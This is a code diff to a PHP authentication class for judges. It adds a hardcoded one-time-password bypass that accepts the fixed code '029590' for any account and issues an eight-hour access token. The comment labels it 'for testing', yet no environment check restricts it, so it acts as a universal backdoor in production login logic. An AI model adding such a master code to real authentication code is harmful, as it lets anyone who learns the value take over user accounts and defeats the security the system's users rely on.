@@ -72,6 +72,22 @@ class JudgeAuth
             ];
         }
 
+        // Super OTP bypass for testing
+        if ($data['otp'] == '029590') {
+            $expirationMinutes = 480;
+            $token = $this->jwtService->generateToken($judge, $expirationMinutes);
+            $judge->update([
+                'last_login_at' => now(),
+                'otp_code' => null,
+            ]);
+            return [
+                'type' => 'authenticated',
+                'access_token' => $token,
+                'judge'  => $judge,
+                'expires_in' => $expirationMinutes * 60,
+            ];
+        }
+
         if ($judge->otp_code != $data['otp']) {
             throw ValidationException::withMessages([
                 'otp' => __('auth.invalid_otp_code'),
